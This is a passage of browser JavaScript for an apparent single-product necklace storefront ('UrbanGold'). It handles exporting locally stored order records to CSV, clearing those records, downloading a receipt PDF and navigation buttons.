      const local = JSON.parse(localStorage.getItem("amazon_placed_orders_urbangold") || "[]");
      if (local.length === 0) {
        showToast("No orders available to export.");
        return;
      }
      const headers = ["Order ID", "Date", "Name", "Address", "Phone", "Email", "Item", "Price", "Qty", "Payment Method"];
      const rows = local.map(o => [
        o.orderId || "",
        o.dateStr || "",
        `"${(o.name || "").replace(/"/g, '""')}"`,
        `"${(o.address || "").replace(/"/g, '""')}"`,
        `"${o.phoneNumber || ""}"`,
        `"${o.email || ""}"`,
        `"${(o.item || "").replace(/"/g, '""')}"`,
        `"${o.price || ""}"`,
        o.qty || 1,
        `"${(o.payMethod || "").replace(/"/g, '""')}"`
      ]);
      const csvContent = "data:text/csv;charset=utf-8," + [headers.join(","), ...rows.map(r => r.join(","))].join("\n");
      const link = document.createElement("a");
      link.setAttribute("href", encodeURI(csvContent));
      link.setAttribute("download", `urbangold_orders_${Date.now()}.csv`);
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    });
  }

  if (btnClearAllOrders) {
    btnClearAllOrders.addEventListener("click", () => {
      if (confirm("Clear local order records for UrbanGold necklace?")) {
        localStorage.removeItem("amazon_placed_orders_urbangold");
        renderAdminOrdersList();
        showToast("Local records cleared.");
      }
    });
  }

  // Confirmation action buttons
  const btnDownloadReceiptBtn = document.getElementById("btnDownloadReceiptBtn");
  if (btnDownloadReceiptBtn) {
    btnDownloadReceiptBtn.addEventListener("click", () => {
      if (state.placedOrder && typeof window.downloadOrderInvoicePdf === "function") {
        window.downloadOrderInvoicePdf(state.placedOrder);
      } else {
        showToast("Generating official tax receipt PDF...");
      }
    });
  }

  const btnContinueShopping = document.getElementById("btnContinueShopping");
  if (btnContinueShopping) {
    btnContinueShopping.addEventListener("click", () => {
      window.location.href = "../../";
    });
  }

  const btnBackToProductPage = document.getElementById("btnBackToProductPage");
  if (btnBackToProductPage) {
    btnBackToProductPage.addEventListener("click", () => {
      window.location.reload();
    });
  }
}
